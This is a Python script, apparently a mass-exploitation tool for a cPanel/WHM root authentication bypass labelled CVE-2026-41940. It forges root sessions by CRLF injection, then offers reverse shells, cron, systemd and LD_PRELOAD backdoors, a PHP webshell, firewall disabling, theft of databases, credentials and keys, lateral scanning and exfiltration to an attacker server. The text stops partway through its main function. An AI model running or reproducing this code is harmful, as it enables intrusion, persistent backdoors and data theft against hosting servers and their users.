#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import base64
import csv
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional, List, Tuple, Dict, Any

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


VULNERABLE_BRANCHES = [
    ("11.40.0.0", "11.86.0.41"),
    ("11.88.0.0", "11.94.0.28"),
    ("11.96.0.0", "11.102.0.39"),
    ("11.104.0.0", "11.110.0.97"),
    ("11.112.0.0", "11.118.0.63"),
    ("11.120.0.0", "11.124.0.35"),
    ("11.126.0.0", "11.126.0.54"),
    ("11.128.0.0", "11.130.0.19"),
    ("11.132.0.0", "11.132.0.29"),
    ("11.134.0.0", "11.134.0.20"),
    ("11.136.0.0", "11.136.0.5"),
]


@dataclass
class ExploitResult:
    target: str
    vulnerable: bool = False
    token: Optional[str] = None
    root_confirmed: bool = False
    whm_version: Optional[str] = None
    hostname: Optional[str] = None
    error: Optional[str] = None
    elapsed: float = 0.0
    post_exploit: Dict[str, Any] = field(default_factory=dict)


class CVE_2026_41940_Weaponized:
    def __init__(self, target_url: str, timeout: int = 15,
                 proxy: Optional[str] = None, retries: int = 5,
                 insecure: bool = False, hostname_override: Optional[str] = None):
        self.original_target = target_url
        self.target_url = self._normalize_url(target_url)
        self.timeout = timeout
        self.retries = retries
        self.hostname_override = hostname_override
        self.session = requests.Session()
        self.session.verify = not insecure
        self.session.headers.update({
            "User-Agent": self._random_ua(),
            "Accept": "*/*",
            "Connection": "close",
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        retry = Retry(
            total=max(0, self.retries - 1),
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],
            raise_on_status=False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        self.hostname: Optional[str] = None
        self.token: Optional[str] = None
        self.cookie_name: Optional[str] = None
        self.raw_session_base: Optional[str] = None
        self.version: Optional[str] = None

    @staticmethod
    def _random_ua() -> str:
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ])

    def _normalize_url(self, url: str) -> str:
        url = url.strip()
        if not url:
            raise ValueError("target URL is empty")
        if url.startswith(("http://", "https://")):
            return url.rstrip("/")

        if "/" in url:
            host_part, path_part = url.split("/", 1)
            path_suffix = "/" + path_part
        else:
            host_part, path_suffix = url, ""

        if not host_part.startswith("[") and host_part.count(":") >= 2:
            m = re.match(r'^(.+):(\d+)$', host_part)
            if m and ":" in m.group(1):
                host_part = f"[{m.group(1)}]:{m.group(2)}"
            else:
                host_part = f"[{host_part}]"

        full = host_part + path_suffix
        try:
            port = urllib.parse.urlparse("//" + full).port
        except ValueError:
            port = None

        if port in (2083, 2087, 2096):
            return f"https://{full}".rstrip("/")
        if port in (2082, 2086, 2095):
            return f"http://{full}".rstrip("/")
        return f"http://{full}".rstrip("/")

    def _discover_hostname(self) -> Optional[str]:
        if self.hostname_override:
            return self.hostname_override
        try:
            r = self.session.get(f"{self.target_url}/openid_connect/cpanelid",
                                 allow_redirects=False, timeout=self.timeout)
            loc = r.headers.get("Location", "")
            m = re.search(r'https?://([^/]+)', loc)
            if m:
                return m.group(1).split(":")[0]
        except requests.RequestException:
            pass
        return None

    def exploit(self) -> ExploitResult:
        result = ExploitResult(target=self.original_target)
        start_time = time.time()
        last_error = None

        discovered = self._discover_hostname()
        if discovered:
            result.hostname = discovered
            self.session.headers["Host"] = discovered

        for attempt in range(1, self.retries + 1):
            try:
                self._stage1_mint_session()
                self._stage2_inject_crlf()
                self._stage3_promote_session()
                confirmed, version = self._stage4_verify_root()
                if confirmed:
                    result.vulnerable = True
                    result.token = self.token
                    result.root_confirmed = True
                    result.whm_version = version
                    self.version = version
                    break
                last_error = "root not confirmed after stage4"
            except Exception as e:
                last_error = str(e)
                if attempt < self.retries:
                    time.sleep(0.5 * attempt)

        if not result.root_confirmed:
            result.error = last_error or "exploit failed after retries"

        result.elapsed = round(time.time() - start_time, 2)
        return result

    def _stage1_mint_session(self) -> None:
        candidates = [
            ("/login/?login_only=1", {"user": "root", "pass": self._random_ua()[:10]}),
            ("/login/", {"user": "root", "pass": self._random_ua()[:10]}),
        ]
        last_err = None
        for path, data in candidates:
            url = f"{self.target_url}{path}"
            try:
                r = self.session.post(url, data=data, allow_redirects=False,
                                      timeout=self.timeout)
            except requests.RequestException as e:
                last_err = str(e)
                continue
            extracted = self._extract_session_cookie(r)
            if not extracted:
                last_err = f"no session cookie (HTTP {r.status_code}) on {path}"
                continue
            name, raw = extracted
            self.raw_session_base = self._strip_ob(urllib.parse.unquote(raw))
            self.cookie_name = name
            return
        raise RuntimeError(f"Stage1 failed: {last_err}")

    def _extract_session_cookie(self, response) -> Optional[Tuple[str, str]]:
        raw_headers: List[str] = []
        if hasattr(response.raw, "headers") and hasattr(response.raw.headers, "getlist"):
            try:
                raw_headers = list(response.raw.headers.getlist("Set-Cookie"))
            except Exception:
                raw_headers = []
        if not raw_headers:
            sc = response.headers.get("Set-Cookie", "")
            if sc:
                raw_headers = [sc]

        candidates: List[Tuple[str, str]] = []
        for hdr in raw_headers:
            for m in re.finditer(r'(whostmgrsession|cpsession)=([^;\s,]+)', hdr, re.I):
                candidates.append((m.group(1).lower(), m.group(2)))

        if not candidates:
            return None
        for name, raw in candidates:
            if name == "whostmgrsession":
                return name, raw
        return candidates[0]

    @staticmethod
    def _strip_ob(raw: str) -> str:
        if not raw:
            raise RuntimeError("session value is empty")
        for pattern in (r'%2[cC]([0-9a-fA-F]{1,64})$', r',([0-9a-fA-F]{1,64})$'):
            m = re.search(pattern, raw)
            if m and m.start() > 0:
                return raw[:m.start()]
        return raw

    def _stage2_inject_crlf(self) -> None:
        if not self.raw_session_base or not self.cookie_name:
            raise RuntimeError("Stage2: no session cookie from Stage1")

        injection = (
            "root:x\r\n"
            "hasroot=1\r\n"
            "tfa_verified=1\r\n"
            "user=root\r\n"
            f"cp_security_token=/cpsess{random.randint(1000000000, 9999999999)}\r\n"
            f"successful_internal_auth_with_timestamp={int(time.time())}"
        )
        basic_raw = f"root:{injection}".encode()
        payload_b64 = base64.b64encode(basic_raw).decode()

        headers = {
            "Authorization": f"Basic {payload_b64}",
            "Cookie": f"{self.cookie_name}={urllib.parse.quote(self.raw_session_base)}",
        }
        try:
            self.session.get(f"{self.target_url}/", headers=headers,
                             allow_redirects=False, timeout=self.timeout)
        except requests.RequestException:
            pass

    def _stage3_promote_session(self) -> None:
        if not self.raw_session_base or not self.cookie_name:
            raise RuntimeError("Stage3: missing session cookie")

        headers = {
            "Cookie": f"{self.cookie_name}={urllib.parse.quote(self.raw_session_base)}",
        }
        url = f"{self.target_url}/scripts2/listaccts"
        try:
            r = self.session.get(url, headers=headers, allow_redirects=True,
                                 timeout=self.timeout)
            token_m = re.search(r"/cpsess\d+", r.headers.get("Location", "")) or \
                      re.search(r"/cpsess\d+", r.text)
            if token_m:
                self.token = token_m.group(0)
        except requests.RequestException:
            pass

        if not self.token:
            try:
                r2 = self.session.get(f"{self.target_url}/",
                                      headers=headers, allow_redirects=False,
                                      timeout=self.timeout)
                token_m = re.search(r"/cpsess\d+", r2.headers.get("Location", "")) or \
                          re.search(r"/cpsess\d+", r2.text)
                if token_m:
                    self.token = token_m.group(0)
            except requests.RequestException:
                pass

    def _stage4_verify_root(self) -> Tuple[bool, Optional[str]]:
        if not self.token:
            return False, None

        version: Optional[str] = None
        try:
            r = self.session.get(
                f"{self.target_url}{self.token}/json-api/version?api.version=1",
                timeout=self.timeout
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    if not self._is_api_error_response(data):
                        version = (data.get("data", {}).get("version")
                                   or data.get("version"))
                        if (data.get("user") == "root"
                                or data.get("hasroot") is True
                                or data.get("data", {}).get("user") == "root"):
                            return True, version or "unknown"
                except json.JSONDecodeError:
                    pass
        except requests.RequestException:
            pass

        try:
            r = self.session.get(
                f"{self.target_url}{self.token}/json-api/myprivs?api.version=1",
                timeout=self.timeout
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    if not self._is_api_error_response(data):
                        privs = (data.get("data", {}).get("privs")
                                 or data.get("privs") or [])
                        if self._privs_indicate_root(privs):
                            return True, version or "unknown"
                except json.JSONDecodeError:
                    pass
        except requests.RequestException:
            pass

        try:
            r = self.session.get(
                f"{self.target_url}{self.token}/json-api/listaccts?api.version=1",
                timeout=self.timeout
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    if not self._is_api_error_response(data):
                        accts = (data.get("data", {}).get("acct")
                                 or data.get("acct") or [])
                        if any(self._account_has_root_flag(a) for a in accts):
                            return True, version or "unknown"
                except json.JSONDecodeError:
                    pass
        except requests.RequestException:
            pass

        return False, version

    @staticmethod
    def _privs_indicate_root(privs) -> bool:
        if not privs:
            return False
        if isinstance(privs, str):
            privs = [privs]
        if not isinstance(privs, list):
            return False
        for p in privs:
            if isinstance(p, str) and p.lower() in ("all", "root"):
                return True
        return False

    @staticmethod
    def _is_api_error_response(data: dict) -> bool:
        if not isinstance(data, dict):
            return False
        if data.get("error") or data.get("reason"):
            return True
        cpanel_result = data.get("cpanelresult")
        if isinstance(cpanel_result, dict):
            if cpanel_result.get("error"):
                return True
            data_field = cpanel_result.get("data")
            if isinstance(data_field, dict) and str(data_field.get("result")) == "0":
                return True
        return False

    @staticmethod
    def _account_has_root_flag(acct) -> bool:
        if not isinstance(acct, dict):
            return False
        return (
            acct.get("has_root") is True
            or acct.get("owner") == "root"
            or str(acct.get("has_root", "")).lower() == "true"
        )

    def _whm_api(self, endpoint: str, params: Optional[Dict] = None,
                 method: str = "GET") -> Optional[requests.Response]:
        if not self.token:
            return None
        url = f"{self.target_url}{self.token}/json-api/{endpoint}"
        try:
            if method.upper() == "POST":
                return self.session.post(url, data=params, timeout=self.timeout)
            return self.session.get(url, params=params, timeout=self.timeout)
        except requests.RequestException:
            return None

    @staticmethod
    def _safe_json(r: requests.Response) -> dict:
        try:
            return r.json()
        except Exception:
            return {}

    def post_dump(self) -> Dict[str, Any]:
        info: Dict[str, Any] = {}
        for ep in ("version", "listaccts", "listzones", "getserverinfo",
                    "listusers", "listresellers", "getdiskusage"):
            r = self._whm_api(ep)
            if r and r.status_code == 200:
                try:
                    info[ep] = r.json()
                except Exception:
                    pass
        return info

    def post_exec(self, command: str) -> str:
        endpoints = [
            ("scripts/run_script", {"script": "bash", "arguments": f"-c '{command}'"}, "GET"),
            ("rawexec", {"command": command}, "GET"),
        ]
        for endpoint, params, method in endpoints:
            r = self._whm_api(endpoint, params, method)
            if r and r.status_code == 200 and not self._is_api_error_response(
                    self._safe_json(r)):
                return r.text
        return "[-] Command execution failed"

    def post_passwd(self, new_password: str) -> bool:
        r = self._whm_api("passwd", {"user": "root", "password": new_password})
        return bool(r and r.status_code == 200)

    def post_ssh_key(self, pubkey_path: Optional[str] = None) -> str:
        if pubkey_path and os.path.isfile(pubkey_path):
            with open(pubkey_path) as f:
                pubkey = f.read().strip()
        else:
            key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
            if not os.path.isfile(key_path):
                return "[-] No public key found"
            with open(key_path) as f:
                pubkey = f.read().strip()

        cmd = (
            f'mkdir -p /root/.ssh && '
            f'echo "{pubkey}" >> /root/.ssh/authorized_keys && '
            f'chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys'
        )
        return self.post_exec(cmd)

    def post_add_user(self, username: str, password: str, domain: str,
                      plan: str = "default") -> str:
        params = {"username": username, "password": password,
                  "domain": domain, "plan": plan}
        for method in ("POST", "GET"):
            r = self._whm_api("createacct", params, method=method)
            if r and r.status_code == 200:
                return r.text
        return "[-] Failed to create account"

    def post_create_reseller(self, username: str, password: str) -> str:
        r = self._whm_api("setupreseller",
                          {"user": username, "makeowner": 1},
                          method="POST")
        if r and r.status_code == 200:
            return r.text
        return "[-] Failed to create reseller"

    def post_suspend_user(self, username: str, reason: str = "security") -> str:
        r = self._whm_api("suspendacct", {"user": username, "reason": reason},
                          method="POST")
        return r.text if r and r.status_code == 200 else "[-] Failed"

    def post_remove_user(self, username: str) -> str:
        r = self._whm_api("removeacct", {"user": username}, method="POST")
        return r.text if r and r.status_code == 200 else "[-] Failed"

    def post_change_package(self, username: str, package: str) -> str:
        r = self._whm_api("changepackage", {"user": username, "pkg": package},
                          method="POST")
        return r.text if r and r.status_code == 200 else "[-] Failed"

    def post_revshell(self, lhost: str, lport: int) -> str:
        payloads = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'",
            f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"nc -e /bin/sh {lhost} {lport}",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        ]
        results = []
        for p in payloads:
            out = self.post_exec(p)
            results.append(f"[{p[:50]}] -> {out[:100]}")
        return "\n".join(results)

    def post_cron_persistence(self, lhost: str, lport: int) -> str:
        payload = f"* * * * * root bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        cmd = f"(crontab -l 2>/dev/null; echo '{payload}') | crontab - && " \
              f"echo '{payload}' >> /etc/crontab && true"
        return self.post_exec(cmd)

    def post_systemd_backdoor(self, lhost: str, lport: int) -> str:
        unit = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"""
        b64 = base64.b64encode(unit.encode()).decode()
        cmd = (
            f"echo {b64} | base64 -d > /etc/systemd/system/system-update.service && "
            f"systemctl daemon-reload && systemctl enable system-update.service && "
            f"systemctl start system-update.service"
        )
        return self.post_exec(cmd)

    def post_ld_preload_backdoor(self) -> str:
        src = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
__attribute__((constructor)) void init(void) {
    if (geteuid() == 0 && access("/tmp/.x", F_OK) != 0) {
        system("echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd 2>/dev/null; touch /tmp/.x");
    }
}
'''
        b64 = base64.b64encode(src.encode()).decode()
        cmd = (
            f"echo {b64} | base64 -d > /tmp/.bd.c && "
            f"gcc -shared -fPIC -o /lib/libnss_bd.so /tmp/.bd.c 2>/dev/null && "
            f"echo '/lib/libnss_bd.so' >> /etc/ld.so.preload && rm -f /tmp/.bd.c"
        )
        return self.post_exec(cmd)

    def post_modify_ssh(self) -> str:
        cmd = (
            "sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && "
            "sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && "
            "sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config && "
            "systemctl restart sshd 2>/dev/null || service sshd restart 2>/dev/null; true"
        )
        return self.post_exec(cmd)

    def post_disable_security(self) -> Dict[str, str]:
        return {
            "csf": self.post_exec("csf -x 2>/dev/null; systemctl stop csf 2>/dev/null; true"),
            "cphulk": self.post_exec("whmapi1 disable_cphulk 2>/dev/null; true"),
            "modsec": self.post_exec(
                "/usr/local/cpanel/scripts/modsec_vendor disable_all 2>/dev/null; true"),
            "firewalld": self.post_exec(
                "systemctl stop firewalld 2>/dev/null; systemctl disable firewalld 2>/dev/null; true"),
            "iptables": self.post_exec(
                "iptables -F; iptables -X; iptables -P INPUT ACCEPT; "
                "iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT"),
        }

    def post_extract_emails(self) -> str:
        cmd = (
            "for d in /home/*/mail /var/cpanel/users/*; do "
            "grep -r 'password' $d 2>/dev/null | head -100; "
            "done; "
            "find /home -name '*.netrc' -o -name '*.emailpass' 2>/dev/null | "
            "xargs cat 2>/dev/null; "
            "grep -rE '^[a-zA-Z0-9._-]+@.+:[^:]+' /etc/ 2>/dev/null | head -100"
        )
        return self.post_exec(cmd)

    def post_extract_databases(self) -> str:
        cmd = (
            "mysqldump --single-transaction --all-databases 2>/dev/null | gzip | base64; "
            "ls -la /var/lib/mysql/*.sql 2>/dev/null; "
            "cat /root/.my.cnf 2>/dev/null"
        )
        return self.post_exec(cmd)

    def post_extract_cpanel_users(self) -> str:
        return self.post_exec(
            "for f in /var/cpanel/users/*; do echo '=== ' $f; cat $f; done; "
            "ls -la /var/cpanel/passwd 2>/dev/null; "
            "cat /var/cpanel/passwd 2>/dev/null"
        )

    def post_extract_ssl_keys(self) -> str:
        return self.post_exec(
            "find /etc/ssl /usr/local/cpanel -name '*.key' -exec sh -c "
            "'echo \"=== $1\"; head -5 $1' _ {} \\; 2>/dev/null | head -200"
        )

    def post_extract_cron_jobs(self) -> str:
        return self.post_exec(
            "for u in $(cut -d: -f1 /etc/passwd); do "
            "echo '=== crontab for' $u; crontab -l -u $u 2>/dev/null; "
            "done; "
            "cat /etc/crontab 2>/dev/null; "
            "ls -la /etc/cron.d/ 2>/dev/null"
        )

    def post_extract_bash_history(self) -> str:
        return self.post_exec(
            "for h in /root/.bash_history /home/*/.bash_history; do "
            "echo '=== ' $h; cat $h 2>/dev/null; done"
        )

    def post_extract_ssh_agent(self) -> str:
        return self.post_exec(
            "for s in /tmp/ssh-* /tmp/ssh-*/agent.*; do "
            "echo '=== ' $s; SSH_AUTH_SOCK=$s ssh-add -l 2>/dev/null; done"
        )

    def post_api_token(self, token_name: Optional[str] = None) -> str:
        token_name = token_name or f"tok_{random.randint(10000, 99999)}"
        r = self._whm_api("api_token_create",
                          {"name": token_name, "expires_at": "none"},
                          method="POST")
        if r and r.status_code == 200:
            return r.text
        return "[-] Failed to create API token"

    def post_full_backup(self, username: str) -> str:
        r = self._whm_api("create_user_backup",
                          {"user": username, "homedir": 1, "mysql": 1,
                           "email": 1, "ssl": 1})
        return r.text if r and r.status_code == 200 else "[-] Failed"

    def post_lateral_scan(self, subnet: Optional[str] = None) -> str:
        target = subnet or "$(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | head -1 | cut -d. -f1-3)"
        cmd = (
            f"net={target}; "
            f"for h in $(seq 1 254); do "
            f"timeout 0.3 bash -c 'echo > /dev/tcp/$net.$h/22' 2>/dev/null && "
            f"echo \"$net.$h:22 open\"; "
            f"timeout 0.3 bash -c 'echo > /dev/tcp/$net.$h/3306' 2>/dev/null && "
            f"echo \"$net.$h:3306 open\"; "
            f"timeout 0.3 bash -c 'echo > /dev/tcp/$net.$h/2087' 2>/dev/null && "
            f"echo \"$net.$h:2087 open\"; "
            f"done"
        )
        return self.post_exec(cmd)

    def post_read_file(self, path: str) -> str:
        return self.post_exec(f"cat {path}")

    def post_write_file(self, path: str, content: str) -> str:
        encoded = base64.b64encode(content.encode()).decode()
        return self.post_exec(f"echo {encoded} | base64 -d > {path}")

    def post_deploy_webshell(self, path: str = "/usr/local/cpanel/base/frontend/jupiter/index.php") -> str:
        webshell = '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>'
        return self.post_write_file(path, webshell)

    def post_exfil(self, exfil_url: str, payload: str, tag: str = "data") -> str:
        b64 = base64.b64encode(payload.encode()).decode()
        cmd = (
            f"curl -sk -X POST -d 'tag={tag}&data={b64}' {exfil_url} 2>/dev/null || "
            f"wget -q --post-data='tag={tag}&data={b64}' -O- {exfil_url} 2>/dev/null"
        )
        return self.post_exec(cmd)

    def post_auto_pwn(self, args) -> Dict[str, Any]:
        data: Dict[str, Any] = {}
        data["dump"] = self.post_dump()

        if args.ssh_key is not False:
            data["ssh_key"] = self.post_ssh_key(
                args.ssh_key if args.ssh_key and args.ssh_key is not True else None)

        data["modify_ssh"] = self.post_modify_ssh()
        data["disable_security"] = self.post_disable_security()

        if args.revshell:
            data["revshell"] = self.post_revshell(
                args.revshell[0], int(args.revshell[1]))
            data["cron"] = self.post_cron_persistence(
                args.revshell[0], int(args.revshell[1]))
            data["systemd"] = self.post_systemd_backdoor(
                args.revshell[0], int(args.revshell[1]))

        data["ld_preload"] = self.post_ld_preload_backdoor()
        data["emails"] = self.post_extract_emails()
        data["databases"] = self.post_extract_databases()
        data["cpanel_users"] = self.post_extract_cpanel_users()
        data["ssl_keys"] = self.post_extract_ssl_keys()
        data["cron_jobs"] = self.post_extract_cron_jobs()
        data["bash_history"] = self.post_extract_bash_history()
        data["ssh_agent"] = self.post_extract_ssh_agent()
        data["api_token"] = self.post_api_token()
        data["lateral_scan"] = self.post_lateral_scan()

        if args.exfil_server:
            for tag, val in data.items():
                try:
                    self.post_exfil(args.exfil_server, str(val)[:100000], tag)
                except Exception:
                    pass

        return data


def interactive_menu(tool: CVE_2026_41940_Weaponized):
    print("\n" + "=" * 65)
    print("  CVE-2026-41940 WEAPONIZED — INTERACTIVE ROOT SESSION")
    print("=" * 65)
    menu = {
        "1": ("Full server reconnaissance dump", lambda: tool.post_dump()),
        "2": ("Execute command via WHM API", lambda: tool.post_exec(input("CMD: "))),
        "3": ("Execute command via SSH (password rotation)", lambda: tool.rce_via_passwd_ssh(input("CMD: "))),
        "4": ("Inject SSH public key", lambda: tool.post_ssh_key(None)),
        "5": ("Create cPanel user", lambda: tool.post_add_user(
            input("USER: "), input("PASS: "), input("DOMAIN: "))),
        "6": ("Create WHM reseller (full admin)", lambda: tool.post_create_reseller(
            input("USER: "), input("PASS: "))),
        "7": ("Create WHM API token", lambda: tool.post_api_token()),
        "8": ("Reverse shell", lambda: tool.post_revshell(
            input("LHOST: "), int(input("LPORT: ")))),
        "9": ("Cron persistence reverse shell", lambda: tool.post_cron_persistence(
            input("LHOST: "), int(input("LPORT: ")))),
        "10": ("Systemd persistence reverse shell", lambda: tool.post_systemd_backdoor(
            input("LHOST: "), int(input("LPORT: ")))),
        "11": ("Install LD_PRELOAD rootkit", lambda: tool.post_ld_preload_backdoor()),
        "12": ("Modify SSH config (allow root/password)", lambda: tool.post_modify_ssh()),
        "13": ("Disable all security controls (CSF/cPHulk/ModSec)", lambda: tool.post_disable_security()),
        "14": ("Extract email credentials", lambda: tool.post_extract_emails()),
        "15": ("Extract all databases (mysqldump)", lambda: tool.post_extract_databases()),
        "16": ("Extract cPanel user hashes", lambda: tool.post_extract_cpanel_users()),
        "17": ("Extract SSL private keys", lambda: tool.post_extract_ssl_keys()),
        "18": ("Extract cron jobs", lambda: tool.post_extract_cron_jobs()),
        "19": ("Extract bash history", lambda: tool.post_extract_bash_history()),
        "20": ("Extract SSH agent keys", lambda: tool.post_extract_ssh_agent()),
        "21": ("Internal network scan (22/3306/2087)", lambda: tool.post_lateral_scan()),
        "22": ("Deploy PHP webshell", lambda: tool.post_deploy_webshell(
            input("PATH (default: jupiter/index.php): ")
            or "/usr/local/cpanel/base/frontend/jupiter/index.php")),
        "23": ("Read remote file", lambda: tool.post_read_file(input("PATH: "))),
        "24": ("Write remote file", lambda: tool.post_write_file(
            input("PATH: "), input("CONTENT: "))),
        "25": ("Full user backup (homedir+mysql+email+ssl)", lambda: tool.post_full_backup(input("USER: "))),
        "26": ("Suspend user", lambda: tool.post_suspend_user(input("USER: "))),
        "27": ("Remove user", lambda: tool.post_remove_user(input("USER: "))),
        "28": ("Change user package", lambda: tool.post_change_package(
            input("USER: "), input("PACKAGE: "))),
    }
    for k, (desc, _) in menu.items():
        print(f"  {k:>2}. {desc}")
    print("   q. Exit")

    while True:
        try:
            choice = input("\nweaponized> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if choice.lower() in ("q", "exit", "quit"):
            break
        if choice in menu:
            try:
                result = menu[choice][1]()
                print(f"\n[+] {str(result)[:3000]}\n")
            except Exception as e:
                print(f"[-] Error: {e}")
        else:
            print("[-] Invalid option")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-41940 Weaponized — cPanel/WHM Root RCE"
    )
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-l", "--list", help="File with targets")
    parser.add_argument("-t", "--threads", type=int, default=10)
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--retries", type=int, default=5)
    parser.add_argument("--proxy", help="HTTP proxy")
    parser.add_argument("--insecure", action="store_true",
                        help="Disable TLS verification")
    parser.add_argument("--hostname", help="Override Host header")
    parser.add_argument("--out-dir", default="./cve_2026_41940_loot")

    parser.add_argument("--dump", action="store_true")
    parser.add_argument("--exec", metavar="CMD")
    parser.add_argument("--rce", metavar="CMD")
    parser.add_argument("--ssh-key", nargs="?", const=True, metavar="PATH")
    parser.add_argument("--add-user", nargs=3, metavar=("USER", "PASS", "DOMAIN"))
    parser.add_argument("--bulk-users", metavar="CSV_FILE")
    parser.add_argument("--create-reseller", nargs=2, metavar=("USER", "PASS"))
    parser.add_argument("--revshell", nargs=2, metavar=("LHOST", "LPORT"))
    parser.add_argument("--cron-persist", nargs=2, metavar=("LHOST", "LPORT"))
    parser.add_argument("--systemd-persist", nargs=2, metavar=("LHOST", "LPORT"))
    parser.add_argument("--ld-preload", action="store_true")
    parser.add_argument("--modify-ssh", action="store_true")
    parser.add_argument("--disable-security", action="store_true")
    parser.add_argument("--webshell", nargs="?",
                        const="/usr/local/cpanel/base/frontend/jupiter/index.php",
                        metavar="PATH")
    parser.add_argument("--flush-firewall", action="store_true")

    parser.add_argument("--extract-emails", action="store_true")
    parser.add_argument("--extract-databases", action="store_true")
    parser.add_argument("--extract-cpanel-users", action="store_true")
    parser.add_argument("--extract-ssl-keys", action="store_true")
    parser.add_argument("--extract-cron-jobs", action="store_true")
    parser.add_argument("--extract-bash-history", action="store_true")
    parser.add_argument("--extract-ssh-agent", action="store_true")
    parser.add_argument("--api-token", action="store_true")
    parser.add_argument("--full-backup", metavar="USER")
    parser.add_argument("--lateral-scan", nargs="?", const="", metavar="SUBNET")

    parser.add_argument("--dump-shadow", action="store_true")
    parser.add_argument("--dump-ssh-keys", action="store_true")
    parser.add_argument("--read-file", metavar="PATH")
    parser.add_argument("--write-file", nargs=2, metavar=("PATH", "CONTENT"))
    parser.add_argument("--suspend-user", metavar="USER")
    parser.add_argument("--remove-user", metavar="USER")
    parser.add_argument("--change-package", nargs=2, metavar=("USER", "PACKAGE"))

    parser.add_argument("--exfil-server", help="URL for data exfiltration")
    parser.add_argument("--auto-pwn", action="store_true",
                        help="Execute full post-exploitation chain")
    parser.add_argument("--interactive", action="store_true")
    parser.add_argument("--shell", action="store_true")
    parser.add_argument("-o", "--output", help="JSON report path")

    args = parser.parse_args()

    if not args.url and not args.list:
        parser.print_help()
        sys.exit(1)

    if args.threads < 1 or args.threads > 200:
        parser.error("--threads must be between 1 and 200")
    if args.timeout < 1 or args.timeout > 300:
        parser.error("--timeout must be between 1 and 300 seconds")
    if args.retries < 1 or args.retries > 20:
        parser.error("--retries must be between 1 and 20")

    targets: List[str] = []
    if args.url:
        targets.append(args.url)
    if args.list:
        try:
            with open(args.list, encoding="utf-8") as f:
                targets.extend(l.strip() for l in f
                               if l.strip() and not l.startswith("#"))
        except OSError as e:
            parser.error(f"cannot read list file: {e}")

    if not targets:
        parser.error("no targets to process")

    os.makedirs(args.out_dir, exist_ok=True)

    print(f"[*] CVE-2026-41940 WEAPONIZED")
    print(f"[*] Targets: {len(targets)} | Threads: {args.threads}")
    print(f"[*] Output: {args.out_dir}\n")

    results: List[ExploitResult] = []
    lock = threading.Lock()
    done = [0]

    def process(tgt: str):
        tool = CVE_2026_41940_Weaponized(
            tgt, timeout=args.timeout, proxy=args.proxy,
            retries=args.retries, insecure=args.insecure,
            hostname_override=args.hostname)
        res = tool.exploit()

        if res.root_confirmed:
            try:
                if args.auto_pwn:
                    res.post_exploit = tool.post_auto_pwn(args)
                else:
                    res.post_exploit["dump"] = tool.post_dump()
                    if args.ssh_key:
                        res.post_exploit["ssh_key"] = tool.post_ssh_key(
                            args.ssh_key if args.ssh_key is not True else None)
                    if args.add_user:
                        res.post_exploit["add_user"] = tool.post_add_user(*args.add_user)
                    if args.bulk_users and os.path.isfile(args.bulk_users):
                        with open(args.bulk_users) as f:
                            for row in csv.reader(f):
                                if len(row) >= 3:
                                    out = tool.post_add_user(row[0], row[1], row[2])
                                    res.post_exploit.setdefault("bulk", []).append(
                                        f"{row[0]}: {out[:100]}")
                    if args.create_reseller:
                        res.post_exploit["reseller"] = tool.post_create_reseller(
                            *args.create_reseller)
                    if args.revshell:
                        res.post_exploit["revshell"] = tool.post_revshell(
                            args.revshell[0], int(args.revshell[1]))
                    if args.cron_persist:
                        res.post_exploit["cron"] = tool.post_cron_persistence(
                            args.cron_persist[0], int(args.cron_persist[1]))
                    if args.systemd_persist:
                        res.post_exploit["systemd"] = tool.post_systemd_backdoor(
                            args.systemd_persist[0], int(args.systemd_persist[1]))
                    if args.ld_preload:
                        res.post_exploit["ld_preload"] = tool.post_ld_preload_backdoor()
